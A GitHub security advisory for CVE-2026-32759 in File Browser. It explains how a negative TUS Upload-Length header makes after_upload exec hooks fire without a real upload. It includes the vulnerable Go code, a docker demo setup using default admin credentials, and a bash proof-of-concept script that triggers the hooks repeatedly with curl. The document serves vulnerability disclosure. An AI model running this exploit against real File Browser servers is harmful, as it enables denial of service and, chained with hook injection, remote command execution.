# [M] File Browser TUS Negative Upload-Length Fires Post-Upload Hooks Prematurely

## Summary
Severity: Medium
Advisory: GHSA-ffx7-75gc-jg7c
CVE: CVE-2026-32759
CWE: CWE-190, CWE-20
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:L/VA:L/SC:N/SI:L/SA:L (CVSS_V4)
Published: 2026-03-16
Source: https://github.com/advisories/GHSA-ffx7-75gc-jg7c
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.33.8

## Details
> [!NOTE]
> **This feature has been disabled by default for all installations from v2.33.8 onwards, including for existent installations**. To exploit this vulnerability, the instance administrator must turn on a feature and ignore all the warnings about known vulnerabilities. We're publishing this new advisory to make it clear that all vulnerabilities concerning this feature are disclosed.
>
> For more information about tracking vulnerability issues related to the Command Execution features, check https://github.com/filebrowser/filebrowser/issues/5199.

## Summary
The TUS resumable upload handler parses the Upload-Length header as a signed 64-bit integer without validating that the value is non-negative. When a negative value is supplied (e.g. -1), the first PATCH request immediately satisfies the completion condition (newOffset >= uploadLength --> 0 >= -1), causing the server to fire after_upload exec hooks with a partial or empty file. An authenticated user with upload permission can trigger any configured after_upload hook an unlimited number of times for any filename they choose, regardless of whether the file was actually uploaded - with zero bytes written.

## Details

**Affected file:** http/tus_handlers.go

**Vulnerable code - POST (register upload):**
```go
func getUploadLength(r *http.Request) (int64, error) {
    uploadOffset, err := strconv.ParseInt(r.Header.Get("Upload-Length"), 10, 64)
    if err != nil {
        return 0, fmt.Errorf("invalid upload length: %w", err)
    }
    return uploadOffset, nil
}

uploadLength, err := getUploadLength(r)
cache.Register(file.RealPath(), uploadLength)
```

**Vulnerable code - PATCH (write chunk):**
```go
newOffset := uploadOffset + bytesWritten  
if newOffset >= uploadLength {            
    cache.Complete(file.RealPath())
    _ = d.RunHook(func() error { return nil }, "upload", r.URL.Path, "", d.user)
}
```

**The completion check uses signed comparison.** Any negative uploadLength is always less than newOffset ( which starts at 0 ), so the hook fires on the very first PATCH regardless of how many bytes were sent.

**Consequence:** An attacker with upload permission can:
1. Initiate a TUS upload for any filename with Upload-Length: -1
2. Send a PATCH with an empty body ( Upload-Offset: 0 )
3. after_upload hook fires immediately with a 0-byte (or partial) file
4. Repeat indefinitely - each POST+PATCH cycle re-fires the hook

If exec hooks are enabled and perform important operations on uploaded files (virus scanning, image processing, notifications, data pipeline ingestion), they will be triggered with attacker-controlled filenames and empty file contents.

## Demo Server Setup

```bash
docker run -d --name fb-tus \
  -p 8080:80 \
  -v /tmp/fb-tus:/srv \
  -e FB_EXECER=true \
  filebrowser/filebrowser:v2.31.2

ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"admin"}')

curl -s -X PUT http://localhost:8080/api/settings \
  -H "X-Auth: $ADMIN_TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{
    "commands": {
      "after_upload": ["bash -c \"echo HOOK_FIRED: $FILE $(date) >> /tmp/hook_log.txt\""]
    }
  }'
```

## PoC Exploit

```bash
#!/bin/bash

TARGET="http://localhost:8080"

TOKEN=$(curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack3r!pass"}')

echo "[*] Token: ${TOKEN:0:40}..."

FILENAME="/trigger_test_$(date +%s).txt"

echo "[*] Step 1: POST TUS upload with Upload-Length: -1"
curl -s -X POST "$TARGET/api/tus$FILENAME" \
  -H "X-Auth: $TOKEN" \
  -H "Upload-Length: -1" \
  -H "Content-Length: 0" \
  -v 2>&1 | grep -E "HTTP|Location"

echo ""
echo "[*] Step 2: PATCH with empty body (uploadOffset=0 >= uploadLength=-1 → hook fires)"
curl -s -X PATCH "$TARGET/api/tus$FILENAME" \
  -H "X-Auth: $TOKEN" \
  -H "Upload-Offset: 0" \
  -H "Content-Type: application/offset+octet-stream" \
  -H "Content-Length: 0" \
  -v 2>&1 | grep -E "HTTP|Upload"

echo ""
echo "[*] Checking hook log on server (/tmp/hook_log.txt)..."
echo "[*] If hook fired, you will see entries like:"
echo "    HOOK_FIRED: /srv/trigger_test_XXXX.txt <timestamp>"

echo ""
echo "[*] Repeating 5 times to demonstrate unlimited hook triggering..."
for i in $(seq 1 5); do
  FNAME="/spam_hook_$i.txt"
  curl -s -X POST "$TARGET/api/tus$FNAME" \
    -H "X-Auth: $TOKEN" \
    -H "Upload-Length: -1" \
    -H "Content-Length: 0" > /dev/null
  
  curl -s -X PATCH "$TARGET/api/tus$FNAME" \
    -H "X-Auth: $TOKEN" \
    -H "Upload-Offset: 0" \
    -H "Content-Type: application/offset+octet-stream" \
    -H "Content-Length: 0" > /dev/null
  
  echo "  Hook trigger $i sent"
done
echo "[*] Done - 5 hooks fired with 0 bytes uploaded."
```

## Impact

**Exec Hook Abuse (when enableExec = true):**

An attacker can trigger any after_upload exec hook an unlimited number of times with attacker-controlled filenames and empty file contents. Depending on the hook's purpose, this enables:

- **Denial of Service:**

Triggering expensive processing hooks ( virus scanning, transcoding, ML inference ) with zero cost on the attacker's side.

- **Command Injection amplification:**

Combined with the hook injection vulnerability (malicious filename + shell-wrapped hook), each trigger becomes a separate RCE.

- **Business logic abuse:** 

Triggering upload-driven workflows ( S3 ingestion, database inserts, notifications ) with empty payloads or arbitrary filenames.

**Hook-free impact:**

Even without exec hooks, a negative Upload-Length creates an inconsistent cache entry. The file is marked "complete" in the upload cache immediately, but the underlying file may be 0 bytes. Any subsequent read expecting a complete file will receive an empty file.

**Who is affected:**

All deployments using the TUS upload endpoint (`/api/tus`). The `enableExec` flag amplifies the impact from cache inconsistency to remote command execution.

## Resolution

This vulnerability has not been addressed, and has been added to the issue where we're tracking all security vulnerabilities regarding the command execution (https://github.com/filebrowser/filebrowser/issues/5199). Command execution is disabled by default for all installations and users are warned if they enable it. This feature is not to be used in untrusted environments and we recommend to not use it.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-ffx7-75gc-jg7c
- https://nvd.nist.gov/vuln/detail/CVE-2026-32759
- https://github.com/filebrowser/filebrowser/issues/5199
- https://github.com/filebrowser/filebrowser
